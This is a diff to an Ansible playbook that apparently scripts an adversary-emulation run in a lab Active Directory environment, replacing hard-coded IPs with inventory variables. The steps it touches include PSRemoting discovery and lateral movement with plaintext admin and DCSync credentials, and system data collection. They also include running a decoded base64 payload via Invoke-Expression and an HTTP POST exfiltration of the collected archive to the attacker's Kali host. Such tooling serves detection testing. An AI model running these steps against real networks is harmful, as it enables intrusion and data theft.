@@ -6,10 +6,10 @@
   vars:
     ts: "{{ lookup('pipe', 'date -u +%Y%m%d_%H%M%S') }}"
     cap: /home/kali/slopmop-capture
-    suna_dc: 10.1.20.10
-    konoha_dc: 10.1.10.10
-    ws1: 10.1.10.21
-    mail: 10.1.10.20
+    suna_dc: "{{ hostvars['suna-dc1'].ansible_host }}"
+    konoha_dc: "{{ hostvars['konoha-dc1'].ansible_host }}"
+    ws1: "{{ hostvars['konoha-ws1'].ansible_host }}"
+    mail: "{{ hostvars['konoha-mail'].ansible_host }}"
     dcsync_user: svc_adsync
     dcsync_pass: "SyncP@ss2026!"
     suna_domain: sunagakure.wind.ninja
@@ -127,10 +127,13 @@
   vars:
     ts: "{{ lookup('pipe', 'date -u +%Y%m%d_%H%M%S') }}"
     cap: C:\slopmop-capture
+    konoha_dc: "{{ hostvars['konoha-dc1'].ansible_host }}"
+    mail: "{{ hostvars['konoha-mail'].ansible_host }}"
+    kali_ip: "{{ hostvars['kali'].ansible_host }}"
   tasks:
     - name: "Step 03 | Add DC to TrustedHosts for PSRemoting"
       ansible.windows.win_shell: |
-        Set-Item WSMan:\localhost\Client\TrustedHosts -Value "10.1.10.10,10.1.10.20" -Force
+        Set-Item WSMan:\localhost\Client\TrustedHosts -Value "{{ konoha_dc }},{{ mail }}" -Force
         Write-Output "TrustedHosts set"
 
     - name: "Step 03 | AD computer discovery via PSRemoting to DC"
@@ -141,12 +144,12 @@
           'konohagakure\Administrator',
           (ConvertTo-SecureString 'password' -AsPlainText -Force)
         )
-        $computers = Invoke-Command -ComputerName 10.1.10.10 -Credential $cred -Authentication Negotiate -ScriptBlock {
+        $computers = Invoke-Command -ComputerName {% endraw %}{{ konoha_dc }}{% raw %} -Credential $cred -Authentication Negotiate -ScriptBlock {
           Import-Module ActiveDirectory
           Get-ADComputer -Filter * -Properties OperatingSystem,DNSHostName |
             Select-Object Name,DNSHostName,OperatingSystem
         }
-        $computers | Export-Csv -Path "C:\slopmop-capture\ad-discovery.csv" -NoTypeInformation
+        $computers | Export-Csv -Path "{% endraw %}{{ cap }}{% raw %}\ad-discovery.csv" -NoTypeInformation
         Write-Output "Discovered $($computers.Count) computers"
         $computers | Format-Table -AutoSize | Out-String -Width 120
         {% endraw %}
@@ -162,13 +165,13 @@
           'FIRE\Administrator',
           (ConvertTo-SecureString 'password' -AsPlainText -Force)
         )
-        $result = Invoke-Command -ComputerName 10.1.10.20 -Credential $cred -Authentication Negotiate -ScriptBlock {
+        $result = Invoke-Command -ComputerName {% endraw %}{{ mail }}{% raw %} -Credential $cred -Authentication Negotiate -ScriptBlock {
           "Hostname: $env:COMPUTERNAME"
           "User: $(whoami)"
           "Domain: $env:USERDOMAIN"
           "IP: $((Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike '127.*' }).IPAddress)"
         }
-        $result | Out-File -FilePath "C:\slopmop-capture\psremoting-lateral.txt" -Encoding UTF8
+        $result | Out-File -FilePath "{% endraw %}{{ cap }}{% raw %}\psremoting-lateral.txt" -Encoding UTF8
         $result
         Write-Output "---STEP07_DONE---"
         {% endraw %}
@@ -182,7 +185,7 @@
       ansible.windows.win_shell: |
         {% raw %}
         $ts = Get-Date -Format 'yyyyMMdd_HHmmss'
-        $outDir = "C:\slopmop-capture\collection_$ts"
+        $outDir = "{% endraw %}{{ cap }}{% raw %}\collection_$ts"
         New-Item -Path $outDir -ItemType Directory -Force | Out-Null
 
         systeminfo | Out-File "$outDir\systeminfo.txt"
@@ -192,7 +195,7 @@
         netstat -ano | Out-File "$outDir\netstat.txt"
         ipconfig /all | Out-File "$outDir\ipconfig.txt"
 
-        $zipPath = "C:\slopmop-capture\collection_$ts.zip"
+        $zipPath = "{% endraw %}{{ cap }}{% raw %}\collection_$ts.zip"
         Compress-Archive -Path "$outDir\*" -DestinationPath $zipPath -Force
         Write-Output "Collection archive: $((Get-Item $zipPath).Length) bytes"
         Write-Output "---STEP10_DONE---"
@@ -225,9 +228,9 @@
         $log += "--- Decode chain ---`r`n"
         $log += "1. Base64 decode outer layer`r`n2. GZip decompress`r`n3. Base64 decode inner (Unicode)`r`n4. Original PowerShell payload recovered"
 
-        $log | Out-File -FilePath "C:\slopmop-capture\defense-evasion_$ts.log" -Encoding UTF8
+        $log | Out-File -FilePath "{% endraw %}{{ cap }}{% raw %}\defense-evasion_$ts.log" -Encoding UTF8
         $decoded = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b64))
-        Invoke-Expression $decoded | Out-File -FilePath "C:\slopmop-capture\defense-evasion_${ts}_exec.txt" -Encoding UTF8
+        Invoke-Expression $decoded | Out-File -FilePath "{% endraw %}{{ cap }}{% raw %}\defense-evasion_${ts}_exec.txt" -Encoding UTF8
         Write-Output $log
         Write-Output "---STEP11_DONE---"
         {% endraw %}
@@ -239,18 +242,18 @@
     - name: "Step 12 | Exfiltration — HTTP POST to attacker"
       ansible.windows.win_shell: |
         {% raw %}
-        $zipPath = Get-ChildItem "C:\slopmop-capture\collection_*.zip" | Sort-Object LastWriteTime -Descending | Select-Object -First 1
+        $zipPath = Get-ChildItem "{% endraw %}{{ cap }}{% raw %}\collection_*.zip" | Sort-Object LastWriteTime -Descending | Select-Object -First 1
         if ($zipPath) {
           $bytes = [IO.File]::ReadAllBytes($zipPath.FullName)
           try {
             $wc = New-Object System.Net.WebClient
-            $wc.UploadData("http://10.1.99.99:8080/upload", "POST", $bytes)
-            Write-Output "Exfiltrated $($bytes.Length) bytes to 10.1.99.99:8080"
+            $wc.UploadData("http://{% endraw %}{{ kali_ip }}{% raw %}:8080/upload", "POST", $bytes)
+            Write-Output "Exfiltrated $($bytes.Length) bytes to {% endraw %}{{ kali_ip }}{% raw %}:8080"
           } catch {
             Write-Output "Exfil attempt logged (listener may not be ready): $_"
           }
-          $logLine = "$($zipPath.Name) -> http://10.1.99.99:8080/upload ($($bytes.Length) bytes) @ $(Get-Date -Format o)"
-          $logLine | Out-File -FilePath "C:\slopmop-capture\exfil-log.txt" -Encoding UTF8
+          $logLine = "$($zipPath.Name) -> http://{% endraw %}{{ kali_ip }}{% raw %}:8080/upload ($($bytes.Length) bytes) @ $(Get-Date -Format o)"
+          $logLine | Out-File -FilePath "{% endraw %}{{ cap }}{% raw %}\exfil-log.txt" -Encoding UTF8
         } else {
           Write-Output "No collection zip found to exfil"
         }
